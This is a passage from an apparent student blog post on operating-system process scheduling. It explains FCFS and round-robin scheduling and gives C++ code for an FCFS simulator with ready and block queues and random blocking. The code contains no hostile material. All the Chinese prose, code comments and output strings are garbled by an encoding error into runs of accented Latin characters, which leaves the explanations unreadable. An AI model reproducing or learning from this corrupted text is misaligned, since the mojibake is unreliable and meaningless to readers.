å‘ç”Ÿäº‹ä»¶è€Œé˜»å¡ï¼Œæ‰é€€å‡ºå¤„ç†å™¨ã€‚</li><li>å°†ç”¨æˆ·ä½œä¸šå’Œå°±ç»ªè¿›ç¨‹æŒ‰æäº¤é¡ºåºæˆ–å˜ä¸ºå°±ç»ªçŠ¶æ€çš„å…ˆåæ’æˆé˜Ÿåˆ—ï¼Œå¹¶æŒ‰ç…§å…ˆæ¥å…ˆæœåŠ¡çš„æ–¹å¼è¿›è¡Œè°ƒåº¦å¤„ç†ï¼Œæ˜¯ä¸€ç§æœ€æ™®éå’Œæœ€ç®€å•çš„æ–¹æ³•ã€‚å®ƒä¼˜å…ˆè€ƒè™‘åœ¨ç³»ç»Ÿä¸­ç­‰å¾…æ—¶é—´æœ€é•¿çš„ä½œä¸šï¼Œè€Œä¸ç®¡è¦æ±‚è¿è¡Œæ—¶é—´çš„é•¿çŸ­ã€‚</li><li>æŒ‰ç…§å°±ç»ªè¿›ç¨‹è¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„å…ˆåæ¬¡åºè¿›è¡Œè°ƒåº¦ï¼Œç®€å•æ˜“å®ç°ï¼Œåˆ©äºé•¿è¿›ç¨‹ï¼ŒCPUç¹å¿™å‹ä½œä¸šï¼Œä¸åˆ©äºçŸ­è¿›ç¨‹ï¼Œæ’é˜Ÿæ—¶é—´ç›¸å¯¹è¿‡é•¿</li></ul><p><img src="/posts/3f961b4f/image-20211112131036353.png" alt="image-20211112131036353"></p><ol start="2"><li>æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•RR</li></ol><ul><li>åŸç†ï¼šæ—¶é—´ç‰‡è½®è½¬æ³•ä¸»è¦ç”¨äºè¿›ç¨‹è°ƒåº¦ã€‚é‡‡ç”¨æ­¤ç®—æ³•çš„ç³»ç»Ÿï¼Œå…¶ç¨‹åºå°±ç»ªé˜Ÿåˆ—å¾€å¾€æŒ‰è¿›ç¨‹åˆ°è¾¾çš„æ—¶é—´æ¥æ’åºã€‚è¿›ç¨‹è°ƒåº¦æŒ‰ä¸€å®šæ—¶é—´ç‰‡(q)è½®ç•ªè¿è¡Œå„ä¸ªè¿›ç¨‹.</li><li>è¿›ç¨‹æŒ‰åˆ°è¾¾æ—¶é—´åœ¨å°±ç»ªé˜Ÿåˆ—ä¸­æ’é˜Ÿï¼Œè°ƒåº¦ç¨‹åºæ¯æ¬¡æŠŠCPUåˆ†é…ç»™å°±ç»ªé˜Ÿåˆ—é¦–è¿›ç¨‹ä½¿ç”¨ä¸€ä¸ªæ—¶é—´ç‰‡ï¼Œè¿è¡Œå®Œä¸€ä¸ªæ—¶é—´ç‰‡é‡Šæ”¾CPUï¼Œæ’åˆ°å°±ç»ªé˜Ÿåˆ—æœ«å°¾å‚åŠ ä¸‹ä¸€è½®è°ƒåº¦ï¼ŒCPUåˆ†é…ç»™å°±ç»ªé˜Ÿåˆ—çš„é¦–è¿›ç¨‹ã€‚</li><li>å›ºå®šæ—¶é—´ç‰‡è½®è½¬æ³•ï¼š<br>1 æ‰€æœ‰å°±ç»ªè¿›ç¨‹æŒ‰ FCFS è§„åˆ™æ’é˜Ÿã€‚<br>2 å¤„ç†æœºæ€»æ˜¯åˆ†é…ç»™å°±ç»ªé˜Ÿåˆ—çš„é˜Ÿé¦–è¿›ç¨‹ã€‚<br>3 å¦‚æœè¿è¡Œçš„è¿›ç¨‹ç”¨å®Œæ—¶é—´ç‰‡ï¼Œåˆ™ç³»ç»Ÿå°±æŠŠè¯¥<br>è¿›ç¨‹é€å›å°±ç»ªé˜Ÿåˆ—çš„é˜Ÿå°¾ï¼Œé‡æ–°æ’é˜Ÿã€‚<br>4 å› ç­‰å¾…æŸäº‹ä»¶è€Œé˜»å¡çš„è¿›ç¨‹é€åˆ°é˜»å¡é˜Ÿåˆ—ã€‚<br>5 ç³»ç»ŸæŠŠè¢«å”¤é†’çš„è¿›ç¨‹é€åˆ°å°±ç»ªé˜Ÿåˆ—çš„é˜Ÿå°¾</li></ul><p><img src="/posts/3f961b4f/image-20211112130639647.png" alt="image-20211112130639647"></p><h2 id="å››-å®éªŒè®¾è®¡å’Œè¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡å’Œè¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡å’Œè¿‡ç¨‹</h2><h3 id="fcfsè°ƒåº¦ç®—æ³•"><a class="markdownIt-Anchor" href="#fcfsè°ƒåº¦ç®—æ³•"></a> FCFSè°ƒåº¦ç®—æ³•</h3><h4 id="æ•°æ®ç»“æ„"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„"></a> æ•°æ®ç»“æ„</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //è¿›ç¨‹ç»“æ„ä½“ï¼Œè¡¨ç¤ºè¿›ç¨‹ä¿¡æ¯</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//è¿›ç¨‹åå­—</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//åˆ°è¾¾æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//è¿›ç¨‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//è¿›ç¨‹ç­‰å¾…æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//å‘¨è½¬æ—¶é—´</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//è¿›ç¨‹ç»“æŸæ—¶é—´</span><br>    <span class="hljs-comment">//int time_slice;      //è¿›ç¨‹æ—¶é—´ç‰‡</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<br></code></pre></div></td></tr></table></figure><h4 id="ç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#ç¬¦å·è¯´æ˜"></a> ç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//å½“å‰æ—¶é—´</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜</h4><h5 id="è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°"></a> <strong>è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°</strong></h5><blockquote><p>è·å–è¿›ç¨‹ä¿¡æ¯</p><ul><li>å°†è¿›ç¨‹æŒ‰ç…§åˆ°è¾¾æ—¶é—´åŠ å…¥é˜»å¡é˜Ÿåˆ—</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹åˆå§‹åŒ–</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¿›ç¨‹æ•°é‡&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥ç¬¬&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;ä¸ªè¿›ç¨‹çš„åå­—  åˆ°è¾¾æ—¶é—´  æœåŠ¡æ—¶é—´&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//å½“å‰æ— è¿›ç¨‹è¿è¡Œ</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//å°†è¿›ç¨‹åŠ å…¥é˜»å¡é˜Ÿåˆ—ï¼ˆæœªè¾¾åˆ°åˆ™è§†ä¸ºé˜»å¡ï¼‰</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹å‡½æ•°"><a class="markdownIt-Anchor" href="#è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹å‡½æ•°"></a> <strong>è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹å‡½æ•°</strong></h5><blockquote><p>è¿™éƒ¨åˆ†ä»£ç é‡å¤ç‡è¾ƒé«˜ï¼Œæ•…æŠ½è±¡å‡ºæ¥ç»„æˆå‡½æ•°</p><ul><li>å½“å°±ç»ªé˜Ÿåˆ—éç©ºæ—¶ï¼Œä»ä¸­å–å‡ºä¸€ä¸ªè¿›ç¨‹è¿è¡Œï¼ŒåŒæ—¶è®¡ç®—è¯¥è¿›ç¨‹çš„ç­‰å¾…æ—¶é—´</li><li>å¦åˆ™å°†å½“å‰è¿›ç¨‹ç½®ä¸ºç©º</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//å½“å°±ç»ªé˜Ÿåˆ—éç©ºæ—¶</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//å–ä¸‹ä¸ªè¿›ç¨‹</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//è®¡ç®—ç­‰å¾…æ—¶é—´</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//å¦åˆ™å°†è¿è¡Œè¿›ç¨‹ç½®ä¸ºç©º</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="è¿›ç¨‹è°ƒåº¦å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹è°ƒåº¦å‡½æ•°"></a> <strong>è¿›ç¨‹è°ƒåº¦å‡½æ•°</strong></h5><blockquote><p>å®ç°è¿›ç¨‹è°ƒåº¦</p><ul><li>å½“å°±ç»ªé˜Ÿåˆ—ã€é˜»å¡é˜Ÿåˆ—ã€è¿è¡Œè¿›ç¨‹éƒ½ä¸ºç©ºæ—¶ï¼Œè¯´æ˜è¿›ç¨‹å…¨éƒ¨è¿è¡Œå®Œï¼Œç»“æŸç¨‹åº</li><li>å½“é˜»å¡é˜Ÿåˆ—éç©ºä¸”é˜Ÿé¦–å…ƒç´ åˆ°è¾¾æ—¶é—´å·²åˆ°å½“å‰æ—¶é—´ï¼Œåˆ™å°†é˜»å¡é˜Ÿåˆ—é˜Ÿé¦–å…ƒç´ åŠ å…¥å°±ç»ªé˜Ÿåˆ—ï¼Œå¹¶å°†å…¶ä»é˜»å¡é˜Ÿåˆ—åˆ é™¤</li><li>å°±ç»ªé˜Ÿåˆ—éç©ºå’Œè¿è¡Œè¿›ç¨‹ä¸ºç©ºæ—¶ï¼Œåˆ™ä»å°±ç»ªé˜Ÿåˆ—å–å…ƒç´ ï¼Œå¹¶å°†å…¶ä»é˜»å¡é˜Ÿåˆ—åˆ é™¤</li><li>å½“æœ‰è¿›ç¨‹è¿è¡Œæ—¶ï¼Œè¾“å‡ºè¿›ç¨‹ä¿¡æ¯ï¼ŒåŒæ—¶æ”¹å˜å½“å‰æ—¶é—´ç­‰ä¿¡æ¯</li><li>å¦‚æœå½“å‰è¿›ç¨‹æ—¶é—´ç‰‡ç”¨å®Œï¼Œåˆ™å°†å…¶è®°å½•ï¼ŒåŒæ—¶è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹ï¼Œç¨‹åºç»§ç»­å¾ªç¯</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¿›ç¨‹è°ƒåº¦å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//éšæœºæ•°ç§å­</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFSè°ƒåº¦ç®—æ³•------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å½“å‰æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å½“å‰è¿›ç¨‹  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åˆ°è¾¾æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‰©ä½™è¿è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å½“ä¸‰ä¸ªé˜Ÿåˆ—å‡ä¸ºç©ºæ—¶ï¼Œè¯´æ˜è¿›ç¨‹å…¨éƒ¨è¿è¡Œå®Œ</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//ç»“æŸ</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//é˜»å¡é˜Ÿåˆ—éç©ºä¸”é˜Ÿé¦–å…ƒç´ åˆ°è¾¾æ—¶é—´å·²åˆ°å½“å‰æ—¶é—´</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//å°†è¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„æ—¶é—´ä½œä¸ºè¿›ç¨‹åˆ°è¾¾æ—¶é—´ï¼ˆé’ˆå¯¹äºé˜»å¡è¿‡çš„è¿›ç¨‹ï¼‰</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//åˆ™åŠ å…¥å°±ç»ªé˜Ÿåˆ—</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//ä»é˜»å¡é˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//å°±ç»ªé˜Ÿåˆ—éç©ºå’Œè¿è¡Œè¿›ç¨‹ä¸ºç©ºæ—¶</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//åˆ™ä»å°±ç»ªé˜Ÿåˆ—å–é¦–å…ƒç´ </span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//ä»å°±ç»ªé˜Ÿåˆ—åˆ é™¤</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//è‹¥å½“å‰æ— è¿è¡Œè¿›ç¨‹ï¼Œåˆ™è¾“å‡ºç©º</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//å½“å‰æœ‰è¿è¡Œè¿›ç¨‹åˆ™è¾“å‡ºä¿¡æ¯</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//å½“å‰æ—¶é—´åŠ 1</span><br>            run_process.remain_time--; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´å‡1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´ä¸º0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//å–ä¸‹ä¸€ä¸ªè¿›ç¨‹</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//å½“è¿›ç¨‹æœ‰è¿è¡Œæ—¶é—´å’Œæ—¶é—´ç‰‡æ—¶ï¼Œå¯èƒ½å‘ç”Ÿé˜»å¡</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------è¿›ç¨‹é˜»å¡ï¼Œåˆ‡æ¢è¿›ç¨‹----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//è‹¥å‘ç”Ÿé˜»å¡ï¼Œä¿®æ”¹å½“å‰è¿›ç¨‹åˆ°è¾¾æ—¶é—´</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//å¹¶åŠ å…¥é˜»å¡é˜Ÿåˆ—ä¸­</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="æ‰“å°è¿›ç¨‹ä¿¡æ¯å‡½æ•°"><a class="markdownIt-Anchor" href="#æ‰“å°è¿›ç¨‹ä¿¡æ¯å‡½æ•°"></a> <strong>æ‰“å°è¿›ç¨‹ä¿¡æ¯å‡½æ•°</strong></h5><blockquote><p>è¾“å‡ºè¿›ç¨‹ä¿¡æ¯ï¼Œå¹¶è¾“å‡ºæ•´ä¸ªè¿‡ç¨‹çš„å¹³å‡ç­‰å¾…æ—¶é—´</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹åå­—  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;åˆ°è¾¾æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;æœåŠ¡æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å¼€å§‹æ‰§è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;ç»“æŸæ‰§è¡Œæ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;å‘¨è½¬æ—¶é—´  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;ç­‰å¾…æ—¶é—´  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å¹³å‡ç­‰å¾…æ—¶é—´ä¸ºï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="é˜»å¡å‡½æ•°"><a class="markdownIt-Anchor" href="#é˜»å¡å‡½æ•°"></a> é˜»å¡å‡½æ•°</h5><blockquote><p>éšæœºæ¦‚ç‡é˜»å¡</p><p>è®¾ç½®äº†30%çš„é˜»å¡æ¦‚ç‡</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//é˜»å¡å‡½æ•°ï¼Œéšæœºæ¦‚ç‡é˜»å¡</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç "><a class="markdownIt-Anchor" href="#æºä»£ç "></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 